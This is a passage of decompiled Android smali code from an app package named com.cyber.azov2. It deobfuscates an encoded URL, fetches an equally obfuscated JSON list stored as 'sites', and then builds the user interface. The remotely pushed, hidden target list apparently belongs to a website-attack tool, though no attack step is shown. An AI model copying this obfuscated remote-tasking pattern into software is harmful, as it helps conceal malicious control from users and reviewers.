    const-string v1, "WUZHREYMGBdaSQMHEQUfCRFGCgUGQwweBF8UEAlFHFlHWlg="

    .line 140
    invoke-virtual {p0, v1}, Lcom/cyber/azov2/MainActivity;->base64_decode(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p0, v1}, Lcom/cyber/azov2/MainActivity;->hash(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p0, v1}, Lcom/cyber/azov2/MainActivity;->getUrlResponse(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 141
    invoke-virtual {v1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_2

    goto :goto_2

    :cond_2
    move-object p1, v1

    .line 144
    :goto_2
    :try_start_3
    invoke-virtual {p0, p1}, Lcom/cyber/azov2/MainActivity;->base64_decode(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p0, p1}, Lcom/cyber/azov2/MainActivity;->hash(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_4

    .line 151
    :try_start_4
    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1, p1}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V
    :try_end_4
    .catch Lorg/json/JSONException; {:try_start_4 .. :try_end_4} :catch_3

    .line 159
    :try_start_5
    invoke-virtual {v1, v0}, Lorg/json/JSONObject;->getJSONArray(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object p1
    :try_end_5
    .catch Lorg/json/JSONException; {:try_start_5 .. :try_end_5} :catch_2

    .line 165
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    move v1, v4

    .line 166
    :goto_3
    invoke-virtual {p1}, Lorg/json/JSONArray;->length()I

    move-result v2

    if-ge v1, v2, :cond_3

    .line 168
    :try_start_6
    invoke-virtual {p1, v1}, Lorg/json/JSONArray;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-interface {v0, v2}, Ljava/util/List;->add(Ljava/lang/Object;)Z
    :try_end_6
    .catch Lorg/json/JSONException; {:try_start_6 .. :try_end_6} :catch_1

    add-int/lit8 v1, v1, 0x1

    goto :goto_3

    :catch_1
    move-exception p1

    .line 170
    invoke-virtual {p1}, Lorg/json/JSONException;->printStackTrace()V

    return-void

    .line 175
    :cond_3
    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result p1

    new-array p1, p1, [Ljava/lang/String;

    iput-object p1, p0, Lcom/cyber/azov2/MainActivity;->sites:[Ljava/lang/String;

    .line 176
    invoke-interface {v0, p1}, Ljava/util/List;->toArray([Ljava/lang/Object;)[Ljava/lang/Object;

    .line 178
    invoke-virtual {p0}, Lcom/cyber/azov2/MainActivity;->getLayoutInflater()Landroid/view/LayoutInflater;

    move-result-object p1

    invoke-static {p1}, Lcom/example/guiproposal/databinding/ActivityMainBinding;->inflate(Landroid/view/LayoutInflater;)Lcom/example/guiproposal/databinding/ActivityMainBinding;

    move-result-object p1

    iput-object p1, p0, Lcom/cyber/azov2/MainActivity;->binding:Lcom/example/guiproposal/databinding/ActivityMainBinding;

    .line 179
    invoke-virtual {p1}, Lcom/example/guiproposal/databinding/ActivityMainBinding;->getRoot()Landroidx/constraintlayout/widget/ConstraintLayout;

    move-result-object p1

    invoke-virtual {p0, p1}, Lcom/cyber/azov2/MainActivity;->setContentView(Landroid/view/View;)V

    .line 180
    iget-object p1, p0, Lcom/cyber/azov2/MainActivity;->binding:Lcom/example/guiproposal/databinding/ActivityMainBinding;

    iget-object p1, p1, Lcom/example/guiproposal/databinding/ActivityMainBinding;->included:Lcom/example/guiproposal/databinding/BottomSheetBinding;

    invoke-virtual {p1}, Lcom/example/guiproposal/databinding/BottomSheetBinding;->getRoot()Landroid/widget/LinearLayout;

    move-result-object p1

    invoke-static {p1}, Lcom/example/guiproposal/databinding/BottomSheetBinding;->bind(Landroid/view/View;)Lcom/example/guiproposal/databinding/BottomSheetBinding;

    move-result-object p1

    iput-object p1, p0, Lcom/cyber/azov2/MainActivity;->bottomSheetBinding:Lcom/example/guiproposal/databinding/BottomSheetBinding;

    .line 181
    iget-object p1, p1, Lcom/example/guiproposal/databinding/BottomSheetBinding;->bottomSheetLayout:Landroid/widget/LinearLayout;

    invoke-static {p1}, Lcom/google/android/material/bottomsheet/BottomSheetBehavior;->from(Landroid/view/View;)Lcom/google/android/material/bottomsheet/BottomSheetBehavior;

    move-result-object p1

    iput-object p1, p0, Lcom/cyber/azov2/MainActivity;->bottomSheetBehavior:Lcom/google/android/material/bottomsheet/BottomSheetBehavior;

    .line 182
    invoke-virtual {p1, v4}, Lcom/google/android/material/bottomsheet/BottomSheetBehavior;->setDraggable(Z)V

    .line 183
    invoke-direct {p0}, Lcom/cyber/azov2/MainActivity;->setupClickListeners()V

    .line 184
    invoke-direct {p0}, Lcom/cyber/azov2/MainActivity;->setupRecyclerView()V

    .line 185
    invoke-direct {p0}, Lcom/cyber/azov2/MainActivity;->initProgressBar()V

    .line 186
    invoke-direct {p0}, Lcom/cyber/azov2/MainActivity;->updateLevel()V

    return-void

    :catch_2
    move-exception p1

    .line 162
    invoke-virtual {p1}, Lorg/json/JSONException;->printStackTrace()V

    return-void

    :catch_3
    move-exception p1

    .line 154
    invoke-virtual {p1}, Lorg/json/JSONException;->printStackTrace()V

    :catch_4
    return-void

    :catch_5
    move-exception p1

    .line 112
    invoke-virtual {p1}, Lorg/json/JSONException;->printStackTrace()V

    return-void

    :catch_6
    move-exception p1

    .line 104
    invoke-virtual {p1}, Lorg/json/JSONException;->printStackTrace()V

    return-void
.end method
